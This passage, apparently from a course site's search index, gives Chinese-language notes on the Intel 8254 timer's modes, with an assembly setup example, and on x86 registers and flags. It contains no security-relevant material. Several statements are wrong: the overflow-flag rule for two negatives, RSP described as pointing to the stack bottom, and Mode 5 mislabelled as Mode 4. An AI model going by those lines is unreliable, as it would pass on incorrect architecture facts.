0\uff0c\u5b83\u5b9e\u9645\u4ee3\u8868\u7684\u662f\u8be5\u8ba1\u6570\u65b9\u5f0f\u4e0b\u6700\u5927\u7684\u5faa\u73af\u503c\uff1a</p> <ul> <li>Binary: \\(2^{16}=65536\\)</li> <li>BCD: \\(10^4 = 10000\\)<ul> <li>4-bit \u5bf9\u5e94\u4e00\u4e2a BCD \u7801\uff0c\u6240\u4ee5\u5bf9\u5e94\u5341\u8fdb\u5236\u603b\u5171 \\(16/4\\) \u4f4d</li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u6700\u5c0f\u521d\u59cb\u8ba1\u6570\u503c\uff0cMode 2 \u548c 3 \u4e0b\u4e3a 2\uff0c\u5176\u4f59 Mode \u4e2d\u4e3a 1</p> \u5199\u5165 Initial Count \u7684\u539f\u5b50\u6027 <ul> <li>\u968f\u65f6\u91cd\u5199 (Dynamic Reloading)\uff1a \u4f60\u53ef\u4ee5\u968f\u65f6\u5411\u8ba1\u6570\u5668\u5199\u5165\u65b0\u7684\u521d\u59cb\u503c\uff0c\u8fd9\u4e0d\u4f1a\u6539\u53d8\u5df2\u7ecf\u8bbe\u5b9a\u597d\u7684\u5de5\u4f5c\u6a21\u5f0f\uff08Mode\uff09\uff0c\u4f46\u4f1a\u6539\u53d8\u8ba1\u6570\u5668\u7684\u5f53\u524d\u8fdb\u5ea6\u3002</li> <li>\u9632\u6b62\u4e2d\u65ad\u5e72\u6270 (Byte Integrity)\uff1a \u7531\u4e8e 8254 \u662f 16 \u4f4d\u8ba1\u6570\u5668\uff0c\u4f46\u6570\u636e\u603b\u7ebf\u901a\u5e38\u662f 8 \u4f4d\uff0c\u6240\u4ee5\u5199\u5165\u4e00\u4e2a 16 \u4f4d\u8ba1\u6570\u503c\u9700\u8981\u5206\u4e24\u6b21\uff08\u5148\u4f4e\u5b57\u8282\u540e\u9ad8\u5b57\u8282\uff09\u3002<ul> <li>\u8b66\u544a\uff1a \u7edd\u5bf9\u4e0d\u80fd\u5728\u5199\u5b8c\u7b2c\u4e00\u4e2a\u5b57\u8282\u540e\u3001\u8fd8\u6ca1\u5199\u7b2c\u4e8c\u4e2a\u5b57\u8282\u65f6\uff0c\u8ba9\u7a0b\u5e8f\u8df3\u8f6c\u5230\u53e6\u4e00\u4e2a\u4e5f\u4f1a\u64cd\u4f5c\u540c\u4e00\u4e2a\u8ba1\u6570\u5668\u7684\u5b50\u7a0b\u5e8f\u3002\u5426\u5219\u4f1a\u5bfc\u81f4\u8ba1\u6570\u503c\u88ab\u201c\u5f20\u51a0\u674e\u6234\u201d\uff0c\u9020\u6210\u4e25\u91cd\u7684\u903b\u8f91\u9519\u8bef\u3002</li> </ul> </li> </ul> \u6a21\u5f0f \u8ba1\u6570\u7279\u70b9 OUT \u521d\u59cb\u72b6\u6001 \u5230\u8fbe 0 \u540e\u7684\u884c\u4e3a \u5178\u578b\u5e94\u7528\u573a\u666f Mode 0\u8ba1\u6570\u7ed3\u675f\u4e2d\u65ad \u8f6f\u4ef6\u89e6\u53d1\uff08\u4e00\u6b21\u6027\uff09 \u4f4e \u53d8\u4e3a\u9ad8\u5e76\u4fdd\u6301\uff0c\u968f\u540e\u56de\u7ed5 \u4e8b\u4ef6\u8ba1\u6570\u3001\u5b9a\u65f6\u4e2d\u65ad Mode 1\u786c\u4ef6\u5355\u8109\u51b2 \u786c\u4ef6\u89e6\u53d1\uff08retriggerable\uff09 \u9ad8 \u8ba1\u6570\u5f00\u59cb\u65f6\u53d8\u4e3a\u4f4e\uff0c\u8ba1\u6ee1\u540e\u518d\u53d8\u9ad8 \u4ea7\u751f\u5b9a\u65f6\u8109\u51b2\u3001\u5bbd\u5ea6\u8c03\u5236 Mode 2\u5206\u9891\u5668/\u6bd4\u7387\u8ba1 \u81ea\u52a8\u91cd\u88c5\uff08periodic\uff09 \u9ad8 \u4ea7\u751f\u4e00\u4e2a\u7a84\u8d1f\u8109\u51b2\u540e\u5faa\u73af \u7cfb\u7edf\u5b9e\u65f6\u65f6\u949f\u3001\u5206\u9891 Mode 3\u65b9\u6ce2\u53d1\u751f\u5668 \u81ea\u52a8\u91cd\u88c5\uff08periodic\uff09 \u9ad8/\u4f4e\u5207\u6362 \u7ffb\u8f6c\u7535\u5e73\uff0c\u4ea7\u751f 50% \u65b9\u6ce2 \u97f3\u4e50\u97f3\u8c03\u3001\u4e32\u884c\u6ce2\u7279\u7387 Mode 4\u8f6f\u4ef6\u89e6\u53d1\u9009\u901a \u8f6f\u4ef6\u89e6\u53d1\uff08\u4e00\u6b21\u6027\uff09 \u9ad8 \u4ea7\u751f\u4e00\u4e2a\u7a84\u8d1f\u8109\u51b2\u540e\u56de\u7ed5 \u8f6f\u4ef6\u63a7\u5236\u7684\u7cbe\u786e\u5b9a\u65f6 Mode 5\u786c\u4ef6\u89e6\u53d1\u9009\u901a \u786c\u4ef6\u89e6\u53d1\uff08retriggerable\uff09 \u9ad8 \u4ea7\u751f\u4e00\u4e2a\u7a84\u8d1f\u8109\u51b2\u540e\u56de\u7ed5 \u786c\u4ef6\u540c\u6b65\u8109\u51b2\u8f93\u51fa <p>\u6240\u8c13\u81ea\u52a8\u91cd\u88c5\uff0c\u5c31\u662f\u8ba1\u6570\u5668\u5230 0 \u540e\u7acb\u5373\u628a Initial Count \u91cd\u65b0\u88c5\u8f7d\u5f00\u59cb\u4e0b\u4e00\u8f6e\u5faa\u73af</p> <p>\u5bf9\u4e8e\u5176\u5b83 Mode\uff080, 1, 4, 5\uff09\uff0c\u8ba1\u6570\u5668\u5f52\u96f6\u540e\u53ea\u4f1a\u56de\u7ed5\uff08Wrap Around\uff09\uff0c\u5373\u53d8\u4e3a <code>FFFFH</code> \u6216\u8005 <code>9999</code>\uff0c\u7136\u540e\u7ee7\u7eed\u65e0\u76ee\u7684\u5730\u8fd0\u884c\u4e0b\u53bb\uff0c\u8f93\u51fa\u4fe1\u53f7 <code>OUT</code> \u4e0d\u4f1a\u518d\u53d8\u5316  </p> <p>\u6211\u4eec\u4e4b\u524d\u867d\u7136\u8bf4\u8fc7\uff0c\u95e8\u63a7\u4fe1\u53f7\u4e3a 0 \u4ee3\u8868\u505c\u6b62\u8ba1\u6570\uff0c\u95e8\u63a7\u4fe1\u53f7\u4e0a\u5347\u6cbf\u4ee3\u8868\u8ba1\u6570\u5f00\u59cb\u3002\u4f46\u4e0d\u540c\u6a21\u5f0f\u4e0b\u5bf9\u95e8\u63a7\u4fe1\u53f7\u7684\u54cd\u5e94\u65b9\u5f0f\u4e5f\u6709\u6240\u533a\u522b\uff1a</p> <ul> <li>\u7535\u5e73\u654f\u611f (Level Sensitive) \u2014\u2014 \u9488\u5bf9 Mode 0, 2, 3, 4<ul> <li>\u903b\u8f91\uff1aGATE \u50cf\u5f00\u5173\u3002GATE=1 \u65f6\u51c6\u8bb8\u8ba1\u6570\uff1bGATE=0 \u65f6\u6682\u505c\u8ba1\u6570\u3002</li> <li>\u91c7\u6837\uff1a\u5728 CLK \u7684\u4e0a\u5347\u6cbf\u68c0\u67e5 GATE \u7684\u7535\u5e73\u3002</li> </ul> </li> <li>\u4e0a\u5347\u6cbf\u654f\u611f (Rising-edge Sensitive) \u2014\u2014 \u9488\u5bf9 Mode 1, 2, 3, 5<ul> <li>\u903b\u8f91\uff1aGATE \u7684\u4e00\u4e2a\u4ece 0 \u5230 1 \u7684\u8df3\u53d8\uff08\u4e0a\u5347\u6cbf\uff09\u4f1a\u91cd\u65b0\u542f\u52a8 (Restart) \u8ba1\u6570\u3002</li> <li>\u673a\u5236\uff1a\u95e8\u63a7\u4fe1\u53f7\u4e0a\u5347\u6cbf\u4f1a\u89e6\u53d1\u5185\u90e8\u7684\u4e00\u4e2a\u89e6\u53d1\u5668\uff08Flip-flop\uff09\uff0c\u5728\u4e0b\u4e00\u4e2a CLK \u4e0a\u5347\u6cbf\u88ab\u91c7\u6837\u540e\u590d\u4f4d\u3002</li> <li>\u6ce8\u610f\uff1aMode 2 \u548c 3 \u65e2\u652f\u6301\u7535\u5e73\u4f7f\u80fd\uff0c\u4e5f\u652f\u6301\u4e0a\u5347\u6cbf\u91cd\u5f00\u3002</li> </ul> </li> </ul> <p>Mode=0 interrupt at the end of count</p> <ul> <li>Initial Count \u5728 \\(\\overline{WR}\\) \u540e\u7684\u7b2c\u4e00\u4e2a\u65f6\u949f\u4e0b\u964d\u6cbf\u88ab\u88c5\u8f7d\uff0c\u5e76\u5728\u4e4b\u540e\u6bcf\u4e2a\u65f6\u949f\u4e0b\u964d\u6cbf\u51cf\u4e00<ul> <li>\u5f53\u8ba1\u6570\u5668\u4e3a 0 \u65f6\uff0c\u8f93\u51fa OUT \u7acb\u5373\u7f6e 1\uff0c\u5e76\u4e14\u4ea7\u751f\u4e2d\u65ad</li> </ul> </li> <li>\u5f53 GATE \u4fe1\u53f7\u4e3a 0 \u65f6\uff0c\u505c\u6b62\u8ba1\u6570<ul> <li>\u67d0\u4e2a\u65f6\u523b\u65f6\u949f\u548c\u95e8\u63a7\u4fe1\u53f7\u540c\u65f6\u4e0b\u964d\u65f6\uff0c\u4ecd\u7136\u8981\u5bf9\u8ba1\u6570\u5668\u51cf\u4e00\uff08\u4e0b\u56fe 2\uff09</li> <li>\u56e0\u4e3a\u5bf9\u4e8e\u7535\u5e73\u654f\u611f\u7684\u6a21\u5f0f\uff0c\u6211\u4eec\u5728\u65f6\u949f\u4e0a\u5347\u6cbf\u91c7\u6837\u95e8\u63a7\u4fe1\u53f7\uff0c\u6765\u786e\u5b9a\u4e0b\u4e00\u4e2a\u65f6\u949f\u4e0b\u964d\u6cbf\u662f\u5426\u6682\u505c\u8ba1\u6570</li> </ul> </li> <li>Mode 0 \u4e3a\u8f6f\u4ef6\u89e6\u53d1\uff0c\u56e0\u6b64\u8f6f\u4ef6\u5199\u5165\u65b0\u503c\u65f6\u4f1a\u91cd\u65b0\u8ba1\u6570\uff08\u4e0b\u56fe 3\uff09</li> </ul> \u65f6\u5e8f\u56fe 1\u65f6\u5e8f\u56fe 2\u65f6\u5e8f\u56fe 3 <p></p> <p></p> <p></p> <p>Mode=1 hardware retriggerable one-shot</p> <ul> <li>\u63a7\u5236\u5b57\u5199\u5b8c\u540e OUT \u5c31\u88ab\u521d\u59cb\u5316\u4e3a 1\uff0c\u5728\u8ba1\u6570\u5f00\u59cb\u65f6\u4e0b\u964d\u4e3a 0\uff1b\u5f53\u8ba1\u6570\u5668\u4e3a 0 \u65f6\uff0cOUT \u7acb\u5373\u7f6e 1</li> <li>\u5f53\u95e8\u63a7\u4fe1\u53f7 GATE \u51fa\u73b0\u4e0a\u5347\u6cbf\u65f6\uff0c\u4e0b\u4e00\u4e2a\u65f6\u949f\u4e0b\u964d\u6cbf\u4f1a\u52a0\u8f7d\u521d\u503c\u91cd\u65b0\u5f00\u59cb\u8ba1\u6570</li> <li>\u56e0\u4e3a\u662f\u4e0a\u5347\u6cbf\u654f\u611f\u7684\u6a21\u5f0f\uff0c\u56e0\u6b64\u8ba1\u6570\u8fc7\u7a0b\u4e2d\u5c31\u7b97 GATE \u53d8\u4e3a 0\uff0c\u4e5f\u4ecd\u7136\u7ee7\u7eed\u8ba1\u6570</li> </ul> \u65f6\u5e8f\u56fe 1\u65f6\u5e8f\u56fe 2\u65f6\u5e8f\u56fe 3 <p></p> <p></p> <p></p> <p>Mode=2 rate generator</p> <ul> <li>\u8ba1\u6570\u5230 1 \u65f6\u5373\u4ea7\u751f\u4e00\u4e2a\u8d1f\u8109\u51b2\uff0c\u7136\u540e\u4e0b\u4e00\u4e2a\u65f6\u949f\u4e0b\u964d\u6cbf\u6062\u590d\u521d\u503c<ul> <li>\u56e0\u6b64\u6211\u4eec\u8bf4 Mode 2 \u548c 3 \u6700\u5c0f\u521d\u503c\u4e3a 2\uff0c\u56e0\u4e3a\u5982\u679c\u8bbe 1 \u7684\u8bdd\u8f93\u51fa OUT \u6c38\u8fdc\u4e3a 0</li> <li>\u6211\u4eec\u79f0\u9ad8\u7535\u5e73\u6bd4\u4f8b\u4e3a Duty Cycle\uff0c\u5bf9\u4e8e Mode 2 \u503c\u4e3a \\(\\frac{N-1}{N}\\)\uff0c\u5982\u679c \\(N=1\\)\uff0c\u5219\u5360\u7a7a\u6bd4\u4e3a \\(0\\)</li> </ul> </li> <li>Mode 2 \u540c\u65f6\u5bf9\u7535\u5e73\u548c\u4e0a\u5347\u6cbf\u654f\u611f</li> </ul> \u65f6\u5e8f\u56fe 1\u65f6\u5e8f\u56fe 2 <p></p> <p></p> <p>Mode=3 square wave generator</p> <ul> <li>Mode 3 \u548c Mode 2 \u7c7b\u4f3c\uff0c\u4f46\u662f\u5b83\u7684\u5360\u7a7a\u6bd4\u4e3a \\(\\frac{1}{2}\\) \u6216 \\(\\frac{N+1}{2N}\\)\u3002</li> <li>\u4f8b\u5982\u5982\u679c Initial Count \u4e3a 6\uff0c\u90a3\u4e48\u4e09\u4e2a\u5468\u671f\u4e3a\u9ad8\uff0c\u4e09\u4e2a\u5468\u671f\u4e3a\u4f4e\uff0cduty cycle \u7b49\u4e8e \\(\\frac{3}{6}\\)</li> </ul> <p></p> <p>Mode=4 software-triggered strobe</p> <ul> <li>Mode 4,5 \u4e0e Mode 0, 1 \u5bf9\u5e94\uff0c\u533a\u522b\u5728\u4e8e\u5b83\u4eec\u8f93\u51fa\u521d\u503c\u4e3a 1\uff0c\u5e76\u4e14\u8ba1\u6570\u4e3a 0 \u65f6\u4f1a\u53d1\u51fa\u4e00\u4e2a\u8d1f\u8109\u51b2</li> </ul> <p></p> <p>Mode=4 hardware-triggered strobe</p> <p></p> <p>\u3010Example\u3011 \u4f8b\u5982\uff0c\u6211\u4eec\u60f3\u8981\u901a\u8fc7\u5411 8254 \u8f93\u5165 8MHz \u7684\u65f6\u949f\u4fe1\u53f7\uff0c\u5728\u7aef\u53e3 <code>0700H</code> \u751f\u6210 100KHz \u7684 Square Wave \u4ee5\u53ca\u5728\u7aef\u53e3 <code>0702H</code> \u751f\u6210 200KHz \u7684 Continuous Pulse\uff0c\u6211\u4eec\u7684\u63a5\u7ebf\u5982\u4e0b\uff1a</p> <p></p> <p>\u5206\u6790\u8981\u6c42\uff0c\u6211\u4eec\u8ba4\u4e3a\u8f93\u51fa\u9700\u8981\u662f\u8fde\u7eed\u7684\u3001\u80fd\u591f\u81ea\u52a8\u91cd\u88c5\u7684\u65f6\u949f\u4fe1\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u80fd\u9009\u7528 Mode 2 \u548c 3\uff1a</p> <ul> <li>counter 0 uses mode 3 with count 80 (8M/100K).</li> <li>counter 1 uses mode 2 with count 40 (8M/200K).</li> </ul> <p>\u4ee5\u4e0b\u662f\u6b63\u786e\u8bbe\u7f6e\u8ba1\u6570\u5668\u7684\u6c47\u7f16\u4ee3\u7801\uff1a</p> <pre><code>; A procedure that programs the 8254 timer to function\n; as illustrated above\n\nTIME PROC NEAR USES AX DX\n\n    MOV   DX, 706H       ; \u63a7\u5236\u5b57\u7aef\u53e3\n    MOV   AL, 00110110B  ; \u8bbe\u7f6e counter 0 \u4e3a Mode 3\n    OUT   DX, AL         \n    MOV   AL, 01110100B  ; \u8bbe\u7f6e counter 1 \u4e3a Mode 2\n    OUT   DX, AL\n\n    MOV   DX, 700H       ; counter 0 \u7aef\u53e3\n    MOV   AL, 80         ; \u8bbe\u7f6e LSB\n    OUT   DX, AL\n    MOV   AL, 0          ; \u8bbe\u7f6e MSB\n    OUT   DX, AL\n\n    MOV   DX, 702H       ; counter 1 \u7aef\u53e3\n    MOV   AL, 40         ; \u8bbe\u7f6e LSB\n    OUT   DX, AL\n    MOV   AL, 0          ; \u8bbe\u7f6e MSB\n    OUT   DX, AL\n\n    RET\n\nTIME ENDP\n</code></pre> \u5982\u679c\u6211\u4eec\u5e0c\u671b\u4e00\u4e2a 100Hz \u7684\u65b9\u6ce2\u5462\uff1f <p>\\(\\frac{8M}{100}= 80K &gt; 65536\\)\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u5c06 8MHz \u7684\u65f6\u949f\u4fe1\u53f7\u63a5\u5165 Counter 2\uff0c\u8be5\u800c\u8003\u8651\u4e0d\u540c Counter \u4e4b\u95f4\u7684\u4e32\u8054\uff1b\u4f8b\u5982\uff0c\u53ef\u4ee5\u5c06 Counter 0 \u7684\u8f93\u51fa\u63a5\u5165 Counter 2 \u7684 CLK\uff0c\u5e76\u8bbe\u7f6e Initial Count \u503c\u4e3a 1000\uff08\\(\\frac{100K}{100}\\)\uff09</p>"},{"location":"Courses/asm/ch11/#16550","title":"16550","text":"<p>16550 \u662f\u4e00\u4e2a\u4e32\u884c\u7684\u901a\u4fe1\u63a5\u53e3\u3002</p>"},{"location":"Courses/asm/ch2/","title":"The Microprocessor and its Architecture","text":""},{"location":"Courses/asm/ch2/#the-microprocessor-and-its-architecture","title":"The Microprocessor and its Architecture","text":"<p> \u7ea6 3761 \u4e2a\u5b57  41 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p>"},{"location":"Courses/asm/ch2/#registers","title":"Registers","text":"<p>Intel IA-32 \u7684\u57fa\u7840\u6267\u884c\u73af\u5883\u6709\u5982\u4e0b\u5bc4\u5b58\u5668\uff1a</p> <p></p> <p>\u5176\u4e2d\uff0c\u56fe\u7247\u4e0b\u534a\u90e8\u5206\u7684\u6d6e\u70b9\u5bc4\u5b58\u5668\u548c\u5411\u91cf\u5bc4\u5b58\u5668\u4e3a x87 \u65b0\u589e\u7684\u3002</p> <p>\u6ce8\u610f\u5230\u6d6e\u70b9\u63a7\u5236 Flag \u6bd4 EFLAGS \u5bf9\u4e86\u4e00\u4e2a Tag\uff0c\u8fd9\u662f\u56e0\u4e3a\u6d6e\u70b9\u8ba1\u7b97\u76f8\u6bd4\u6574\u578b\u66f4\u52a0\u590d\u6742\uff0c\u9700\u8981\u6807\u8bc6\u820d\u5165\u65b9\u6848\u7b49</p> <p>\u6f14\u53d8\u5230\u5982\u4eca 64-bit mode\uff0c\u5b83\u7684\u6267\u884c\u73af\u5883\u5982\u4e0b\uff1a</p> <p></p> <p>\u5982\u4e0b\u8868\u683c\u66f4\u76f4\u89c2\u7684\u6bd4\u8f83\u4e86\u4e8c\u8005\u7684\u5bc4\u5b58\u5668\u5dee\u5f02\uff0c\u5176\u4e2d\u6df1\u8272\u90e8\u5206\u8868\u793a\u5b58\u5728\u4e0d\u540c\uff1a</p> <p></p> <p>AX, BX, CX, DX, BP, SP, SI, DI \u662f\u81ea x86 \u5f00\u59cb\u5373\u6709\u7684 General-Purpose Registers\uff0c\u5b83\u4eec\u5728\u8bbe\u8ba1\u4e4b\u521d\u6709\u5404\u81ea\u7684\u4f5c\u7528\uff1a</p> Register Name Commonly used as <code>A</code> Accumulator Return value, especially the sum of arithmetic operations80x86 \u5bf9\u4e8e A \u7cfb\u5217\u5bc4\u5b58\u5668\u4fdd\u7559\u4e86\u5355\u72ec\u7684\u64cd\u4f5c\u7801\u6765\u8868\u793a\u662f\u4ec0\u4e48\u8fd0\u7b97\uff0c\u4ece\u800c\u51cf\u5c11\u6307\u4ee4\u7684\u8bd1\u7801\u957f\u5ea6\uff1b\u800c\u7528\u5176\u5b83\u5bc4\u5b58\u5668\uff0c\u5219\u9700\u8981\u6307\u793a\u64cd\u4f5c\u7801\u4ee5\u53ca\u5bc4\u5b58\u5668 <code>B</code> Base Index Starting point of an array or list structure\u901a\u5e38\u5b58\u50a8\u4e00\u4e2a\u5bf9\u8c61\u7684\u504f\u79fb\u5730\u5740 <code>C</code> Counter Used by loops\u5e38\u7528\u4f5c\u5faa\u73af\u8ba1\u6570\u5668\u6216\u4e00\u4e9b\u6307\u4ee4\u7684\u8ba1\u6570\u5668\uff08\u5982 <code>REP</code>\uff09 <code>D</code> Data Extended space for accumulator\u5e38\u5b58\u50a8\u6ea2\u51fa\u7684\u90e8\u5206\u7ed3\u679c\u6570\u636e\uff0c\u4f8b\u5982\u4e58\u6cd5\u7684\u9ad8\u4f4d\u7ed3\u679c\u4ee5\u53ca\u9664\u6cd5\u7684\u9664\u6570 <code>BP</code> Base Pointer Pointer to address of current stack frame\u5c24\u5176\u662f\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019 <code>SP</code> Stack Pointer Pointer to address of last bytes PUSHed to memory \u6307\u5411\u6808\u9876\u7684\u504f\u79fb <code>SI</code> Source Index Starting point of unbounded stream data, especially a string\u901a\u5e38\u5728\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u4e2d\u6307\u5411 source string \u6570\u636e\u7684\u5f00\u5934\uff0c\u4f46\u4e5f\u7528\u4f5c\u4e00\u822c\u7528\u5904 <code>DI</code> Destination Index Ending point of unbounded data, especially in slicing operations\u901a\u5e38\u5728\u5b57\u7b26\u4e32\u64cd\u4f5c\u6307\u4ee4\u4e2d\u6307\u5411 destination string \u6570\u636e\u7684\u5f00\u5934\uff0c\u4f46\u4e5f\u7528\u4f5c\u4e00\u822c\u7528\u5904 <p>\u5927\u90e8\u5206 x86 \u5bc4\u5b58\u5668\u90fd\u6709\u591a\u7c92\u5ea6\u7684\u7279\u6027\uff0c\u5373\u53ef\u4ee5\u5212\u5206\u4e3a\u591a\u4e2a partial register\uff0c\u5bf9\u4e8e A, B, C, D \u7cfb\u5217\u5bc4\u5b58\u5668\uff0c\u5176\u547d\u540d\u89c4\u5219\u5982\u4e0b\uff08\u4ee5 A \u4e3a\u4f8b\uff09\uff1a</p> <p></p> <p>\u4e0a\u56fe\u540c\u65f6\u4e5f\u8bf4\u660e\u4e86\u8be5\u5bc4\u5b58\u5668\u7684\u4fee\u6539\u89c4\u5219\uff0c\u5373\u53ea\u6709\u4fee\u6539 32-bit \u7684 partial register <code>eax</code> \u65f6\uff0c<code>rax</code> \u7684 bit 32-63 \u4f1a\u88ab\u7f6e 0\uff1b\u5176\u4f59\u4fee\u6539\u65f6\u4f59\u4f4d\u4e0d\u53d8\u3002</p> <p>\u7279\u522b\u8bf4\u660e\u7684\u662f\uff0c<code>ah</code> \u548c <code>al</code> \u8fd9\u4e24\u4e2a\u9ad8\u4f4e 8-bit \u5bc4\u5b58\u5668\u53ea\u6709 A, B, C, D \u62e5\u6709\u3002</p> <p>BP, SP, SI, DI \u5176\u5b9e\u4e5f\u6709\u4f4e\u516b\u4f4d\uff0c\u683c\u5f0f\u4e3a BPL \u7b49\uff0c\u4f46\u662f\u8fd9\u53ea\u5728 64-bit mode \u4e0b\u53ef\u7528</p> <p>Intel\uff0cAMD\uff0cVIA \u7684 CPU \u90fd\u4e0d\u652f\u6301\u91cd\u547d\u540d partial register\uff0c\u56e0\u4e3a\u5b83\u4f1a\u62c5\u5fc3\u8fd9\u662f\u4e00\u4e2a\u865a\u5047\u7684\u6570\u636e\u4f9d\u8d56\uff0c\u4ee5\u9632\u7528\u6237\u8981\u5229\u7528 partial \u7684\u7279\u6027\u8fdb\u884c\u7f16\u7a0b\uff0c\u4ee5\u5982\u4e0b\u4e3a\u4f8b\uff0c\u5047\u5b9a\u8981\u8fde\u7eed\u5bf9\u4e24\u5904\u5185\u5b58\u5730\u5740\u8fdb\u884c\u6570\u636e\u4fee\u6539\uff0c\u5176\u4e2d\u53f3\u4fa7\u7684\u7b2c\u4e8c\u6b21\u4fee\u6539\u7684\u662f 16-bit \u7684\u6570\u636e\uff0c\u5982\u679c\u90fd\u7528 A \u7cfb\u5217\u7684\u5bc4\u5b58\u5668\uff0c\u53f3\u8fb9\u7684 <code>AX</code> \u5c31\u4e0d\u80fd\u88ab CPU \u7684\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u6240\u4fee\u6539\uff0c\u4ece\u800c\u5bfc\u81f4 stall\uff1a</p> <p></p> <p>Segment Registers \u5171\u6709\u516d\u4e2a\uff1a</p> <ul> <li>CS  (code): \u4ee3\u7801\u6bb5\uff0c\u5b58\u50a8\u7a0b\u5e8f\u7684\u4ee3\u7801</li> <li>DS (data): \u6570\u636e\u6bb5\uff0c\u5b58\u50a8\u7a0b\u5e8f\u5927\u90e8\u5206\u6570\u636e</li> <li>ES (extra): \u989d\u5916\u6570\u636e\u6bb5\uff0c\u5b58\u50a8\u4e00\u4e9b destination data</li> <li>SS (stack): \u6808</li> <li>FS &amp; GS: 80386-Core2 \u65b0\u589e\u7684\u989d\u5916\u6bb5\u5bc4\u5b58\u5668\uff0c\u53ef\u901a\u7528</li> </ul> <p>64-bit mode \u4e0b\uff0cmemory \u7684\u7ba1\u7406\u65b9\u5f0f\u4ece\u5206\u6bb5\u7ba1\u7406\u53d8\u4e3a\u5206\u9875\u7ba1\u7406\uff0c<code>DS</code>, <code>ES</code>, <code>SS</code> \u88ab\u5ffd\u89c6\uff08\u7f6e 0\uff09\uff0c\u5373\u4fbf\u6211\u4eec\u5c1d\u8bd5\u5bf9\u5176\u4fee\u6539\u4e5f\u53ef\u80fd\u4e0d\u8d77\u4f5c\u7528\uff1a</p> <p></p> <p>\u9664\u4e86\u4ee5\u4e0a\u7684 General-Purpose Registers \u548c Segment Registers\uff0c\u6211\u4eec\u8fd8\u6709\u4e00\u4e9b Special-Purpose Registers\uff0c\u5305\u62ec <code>RIP</code>, <code>RSP</code>, <code>RFLAGS</code> \u7b49\uff1a</p> <ul> <li>RIP \u6307\u5411\u6bb5\u4e2d\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u5373 Instruction Pointer</li> <li>RSP \u6307\u5411\u6808\u5e95\uff0c\u5373 Stack Pointer</li> <li>RFLAGS \u8868\u793a\u5fae\u5904\u7406\u5668\u7684\u72b6\u6001\uff0c\u7528\u6765\u63a7\u5236 operation \u7684\u884c\u4e3a<ul> <li>\u5206\u4e3a\u72b6\u6001\u6807\u5fd7\u3001\u63a7\u5236\u6807\u5fd7\u4ee5\u53ca\u4e00\u4e9b\u4fe1\u606f</li> </ul> </li> </ul> <p></p> <p>\u72b6\u6001\u6807\u5fd7\u6709\uff1a</p> <ul> <li>C (bit 0): Carry Flag \u7b97\u672f\u8fd0\u7b97\u6216\u903b\u8f91\u8fd0\u7b97\u4ea7\u751f\u8fdb\u4f4d\u3001\u501f\u4f4d\u5219\u4e3a 1<ul> <li>\u4e24\u6570\u76f8\u52a0\u4ea7\u751f\u8fdb\u4f4d\u65f6 CF \u7f6e 1</li> <li>\u4e24\u6570\u76f8\u51cf\u4ea7\u751f\u501f\u4f4d\u65f6 CF \u7f6e 1</li> <li>\u4e24\u6570\u76f8\u4e58\u4e58\u79ef\u8d85\u8fc7\u88ab\u4e58\u6570\u5bbd\u5ea6\u65f6 CF \u7f6e 1</li> <li>\u79fb\u4f4d\u6307\u4ee4\u6700\u540e\u79fb\u51fa\u7684\u90a3\u4e00\u4f4d\u4fdd\u5b58\u5728 CF \u4e2d</li> </ul> </li> <li>Z (bit 6): Zero Flag \u7b97\u672f\u8fd0\u7b97\u6216\u903b\u8f91\u8fd0\u7b97\u7684\u7ed3\u679c\u4e3a 0 \u5219\u4e3a 1</li> <li>S (bit 7): Sign Flag \u7b97\u672f\u8fd0\u7b97\u6216\u903b\u8f91\u8fd0\u7b97\u7684\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d<ul> <li>\u5373\u8fd0\u7b97\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d</li> </ul> </li> <li>O (bit 11): Overflow Flag \u8fd0\u7b97\u7ed3\u679c\u8d85\u51fa\u673a\u5668\u53ef\u8868\u793a\u7684\u8303\u56f4\u5219\u4e3a 1<ul> <li>\u5f53\u4e24\u6b63\u6570\u76f8\u52a0\u53d8\u8d1f\u6570\u65f6 OF \u7f6e 1</li> <li>\u5f53\u4e24\u8d1f\u6570\u76f8\u52a0\u53d8\u6b63\u6570\u65f6 OF \u7f6e 0</li> <li>\u5f53\u4e24\u6570\u76f8\u4e58\u4e58\u79ef\u5bbd\u5ea6\u8d85\u8fc7\u88ab\u4e58\u6570\u5bbd\u5ea6\u65f6 OF \u7f6e 1\uff08\u6b64\u65f6 CF \u4e5f\u7f6e 1\uff09</li> <li>\u5f53\u4ec5\u79fb\u52a8\u4e00\u4f4d\uff0c\u4e14\u79fb\u4f4d\u524d\u6700\u9ad8\u4f4d\u4e0d\u7b49\u4e8e\u79fb\u4f4d\u540e\u6700\u9ad8\u4f4d\u65f6 OF \u7f6e 1</li> </ul> </li> <li>P (bit 2): Parity Flag \u8fd0\u7b97\u7ed3\u679c\u4f4e 8 \u4f4d\u4e2d\u4e8c\u8fdb\u5236 1 \u7684\u4e2a\u6570\u4e3a\u5076\u6570\u65f6\u4e3a 1</li> <li>A (bit 4): Auxiliary Flag \u4fdd\u5b58 BCD \u8fd0\u7b97\u4e2d\u9014\u7684 carry \u548c borrow<ul> <li>\u82e5\u6267\u884c\u52a0\u6cd5\u6307\u4ee4\u65f6\u7b2c 3 \u4f4d\u5411\u7b2c 4 \u4f4d\u4ea7\u751f\u8fdb\u4f4d\u5219 AF \u7f6e 1</li> <li>\u82e5\u6267\u884c\u51cf\u6cd5\u6307\u4ee4\u65f6\u7b2c 3 \u4f4d\u5411\u7b2c 4 \u4f4d\u4ea7\u751f\u501f\u4f4d\u5219 AF \u7f6e 1</li> </ul> </li> </ul> <p>\u5bf9\u4e8e\u5982\u4e0b BCD \u8fd0\u7b97\uff0cCF \u53ea\u4fdd\u5b58\u6700\u540e\u7684\u8fdb\u4f4d\uff0c\u4e2d\u95f4\u7684\u8fdb\u4f4d\u7531 AF \u4fdd\u5b58\uff0c\u6307\u793a\u9700\u8981 +6 \u8c03\u6574</p> <p></p> <p>\u63a7\u5236\u6807\u5fd7\u6709\uff1a</p> <ul> <li>D 